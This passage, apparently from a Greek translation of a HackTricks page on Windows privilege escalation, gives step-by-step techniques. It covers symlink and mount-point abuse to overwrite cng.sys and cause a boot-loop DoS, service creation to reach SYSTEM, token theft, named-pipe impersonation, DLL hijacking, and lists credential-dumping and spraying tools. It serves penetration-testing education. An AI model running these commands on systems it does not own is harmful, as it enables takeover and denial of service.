- Η διαδικασία SYSTEM συνεχίζει και προσπαθεί να διαγράψει το `file1.txt`.
- Αλλά τώρα, λόγω του junction + symlink, στην πραγματικότητα διαγράφει:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Result**: `C:\Config.Msi` διαγράφεται από το SYSTEM.

### From Arbitrary Folder Create to Permanent DoS

Εκμεταλλεύσου ένα primitive που σου επιτρέπει να **δημιουργήσεις ένα αυθαίρετο folder ως SYSTEM/admin** — ακόμα και αν **δεν μπορείς να γράψεις files** ή **να ορίσεις weak permissions**.

Δημιούργησε ένα **folder** (όχι file) με το όνομα ενός **critical Windows driver**, π.χ.:
```
C:\Windows\System32\cng.sys
```
- Αυτή η διαδρομή συνήθως αντιστοιχεί στον `cng.sys` kernel-mode driver.
- Αν το **προδημιουργήσεις ως φάκελο**, τα Windows αποτυγχάνουν να φορτώσουν τον πραγματικό driver στο boot.
- Τότε, τα Windows προσπαθούν να φορτώσουν το `cng.sys` κατά το boot.
- Βλέπουν τον φάκελο, **αποτυγχάνουν να επιλύσουν τον πραγματικό driver**, και **κρασάρουν ή σταματούν το boot**.
- Δεν υπάρχει **fallback**, και **καμία ανάκαμψη** χωρίς εξωτερική παρέμβαση (π.χ. boot repair ή πρόσβαση στον δίσκο).

### Από privileged log/backup paths + OM symlinks σε arbitrary file overwrite / boot DoS

Όταν μια **privileged service** γράφει logs/exports σε ένα path που διαβάζεται από ένα **writable config**, ανακατεύθυνε αυτό το path με **Object Manager symlinks + NTFS mount points** για να μετατρέψεις το privileged write σε arbitrary overwrite (ακόμα και **χωρίς** SeCreateSymbolicLinkPrivilege).

**Requirements**
- Το config που αποθηκεύει το target path είναι writable από τον attacker (π.χ. `%ProgramData%\...\.ini`).
- Δυνατότητα δημιουργίας ενός mount point προς `\RPC Control` και ενός OM file symlink (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).
- Μια privileged operation που γράφει σε αυτό το path (log, export, report).

**Example chain**
1. Διάβασε το config για να ανακτήσεις το privileged log destination, π.χ. `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` στο `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Ανακατεύθυνε το path χωρίς admin:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Περίμενε το προνομιούχο component να γράψει το log (π.χ. ο admin ενεργοποιεί "send test SMS"). Η εγγραφή τώρα καταλήγει στο `C:\Windows\System32\cng.sys`.
4. Εξέτασε το overwritten target (hex/PE parser) για να επιβεβαιώσεις τη corruption; το reboot αναγκάζει τα Windows να φορτώσουν το tampered driver path → **boot loop DoS**. Αυτό επίσης γενικεύεται σε οποιοδήποτε protected file ένα προνομιούχο service θα ανοίξει για write.

> Το `cng.sys` φορτώνεται κανονικά από το `C:\Windows\System32\drivers\cng.sys`, αλλά αν υπάρχει ένα copy στο `C:\Windows\System32\cng.sys` μπορεί να επιχειρηθεί πρώτο, καθιστώντας το ένα αξιόπιστο DoS sink για corrupt data.



## **Από High Integrity σε System**

### **Νέο service**

Αν ήδη τρέχεις σε High Integrity process, η **διαδρομή προς SYSTEM** μπορεί να είναι εύκολη απλώς **δημιουργώντας και εκτελώντας ένα νέο service**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> Όταν δημιουργείτε ένα service binary βεβαιωθείτε ότι είναι valid service ή ότι το binary εκτελεί τις απαραίτητες ενέργειες αρκετά γρήγορα, γιατί θα τερματιστεί σε 20s αν δεν είναι valid service.

### AlwaysInstallElevated

Από μια High Integrity process θα μπορούσατε να δοκιμάσετε να **ενεργοποιήσετε τα AlwaysInstallElevated registry entries** και να **εγκαταστήσετε** ένα reverse shell χρησιμοποιώντας ένα _**.msi**_ wrapper.\
[Περισσότερες πληροφορίες για τα registry keys που εμπλέκονται και για το πώς να εγκαταστήσετε ένα _.msi_ package εδώ.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Μπορείτε** [**να βρείτε τον κώδικα εδώ**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Αν έχετε αυτά τα token privileges (πιθανότατα θα το βρείτε αυτό σε ένα ήδη High Integrity process), θα μπορείτε να **ανοίξετε σχεδόν οποιοδήποτε process** (όχι protected processes) με το SeDebug privilege, να **αντιγράψετε το token** του process και να δημιουργήσετε ένα **arbitrary process με εκείνο το token**.\
Χρησιμοποιώντας αυτή την τεχνική συνήθως **επιλέγεται οποιοδήποτε process που τρέχει ως SYSTEM με όλα τα token privileges** (_ναι, μπορείτε να βρείτε SYSTEM processes χωρίς όλα τα token privileges_).\
**Μπορείτε να βρείτε ένα** [**παράδειγμα κώδικα που εκτελεί την προτεινόμενη τεχνική εδώ**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Αυτή η τεχνική χρησιμοποιείται από το meterpreter για να κάνει escalate στο `getsystem`. Η τεχνική συνίσταται στο **δημιουργήσετε ένα pipe και μετά να δημιουργήσετε/καταχραστείτε ένα service για να γράψει σε αυτό το pipe**. Έπειτα, ο **server** που δημιούργησε το pipe χρησιμοποιώντας το **`SeImpersonate`** privilege θα μπορεί να **impersonate το token** του pipe client (του service), αποκτώντας SYSTEM privileges.\
Αν θέλετε να [**μάθετε περισσότερα για τα name pipes θα πρέπει να διαβάσετε αυτό**](#named-pipe-client-impersonation).\
Αν θέλετε να διαβάσετε ένα παράδειγμα του [**πώς να περάσετε από high integrity σε System χρησιμοποιώντας name pipes θα πρέπει να διαβάσετε αυτό**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Αν καταφέρετε να **hijack ένα dll** που **φορτώνεται** από ένα **process** που τρέχει ως **SYSTEM** θα μπορείτε να εκτελέσετε arbitrary code με εκείνα τα permissions. Επομένως το Dll Hijacking είναι επίσης χρήσιμο για αυτό το είδος privilege escalation και, επιπλέον, είναι πολύ **πιο εύκολο να επιτευχθεί από ένα high integrity process** καθώς θα έχει **write permissions** στους φακέλους που χρησιμοποιούνται για τη φόρτωση dlls.\
**Μπορείτε** [**να μάθετε περισσότερα για το Dll hijacking εδώ**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Διαβάστε:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Το καλύτερο tool για να ψάξετε για Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Ελέγχει για misconfigurations και sensitive files (**[**δείτε εδώ**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Detected.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Ελέγχει για ορισμένα πιθανά misconfigurations και συλλέγει πληροφορίες (**[**δείτε εδώ**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Ελέγχει για misconfigurations**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Εξάγει πληροφορίες αποθηκευμένων sessions από PuTTY, WinSCP, SuperPuTTY, FileZilla και RDP. Χρησιμοποιήστε -Thorough σε local.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Εξάγει crendentials από Credential Manager. Detected.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Spray gathered passwords across domain**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Το Inveigh είναι ένα PowerShell ADIDNS/LLMNR/mDNS spoofer και man-in-the-middle tool.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Βασικό Windows enumeration για privesc**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Αναζητά γνωστά privesc vulnerabilities (DEPRECATED για Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Local checks **(Χρειάζονται Admin rights)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Αναζητά γνωστά privesc vulnerabilities (χρειάζεται να γίνει compile με VisualStudio) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Enumerates το host αναζητώντας misconfigurations (περισσότερο tool συλλογής πληροφοριών παρά privesc) (χρειάζεται compile) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Εξάγει credentials από πολλά softwares (precompiled exe στο github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port του PowerUp σε C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Ελέγχει για misconfiguration (executable precompiled στο github). Δεν συνιστάται. Δεν λειτουργεί καλά σε Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Ελέγχει για πιθανά misconfigurations (exe από python). Δεν συνιστάται. Δεν λειτουργεί καλά σε Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Tool που δημιουργήθηκε με βάση αυτό το post (δεν χρειάζεται accesschk για να λειτουργήσει σωστά αλλά μπορεί να το χρησιμοποιήσει).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Διαβάζει το output του **systeminfo** και προτείνει working exploits (local python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Διαβάζει το output του **systeminfo** και προτείνει working exploits (local python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Πρέπει να κάνετε compile το project χρησιμοποιώντας τη σωστή έκδοση του .NET ([δείτε αυτό](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Για να δείτε την εγκατεστημένη έκδοση του .NET στο victim host μπορείτε να κάνετε:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Αναφορές

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [Unit 42 – Privileged File System Vulnerability Present in a SCADA System](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [Symbolic Link Testing Tools – CreateSymlink usage](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [A Link to the Past. Abusing Symbolic Links on Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [RegPwn BOF (Cobalt Strike BOF port)](https://github.com/Flangvik/RegPwnBOF)
- [ZDI - Node.js Trust Falls: Dangerous Module Resolution on Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [Node.js modules: loading from `node_modules` folders](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)

{{#include ../../banners/hacktricks-training.md}}
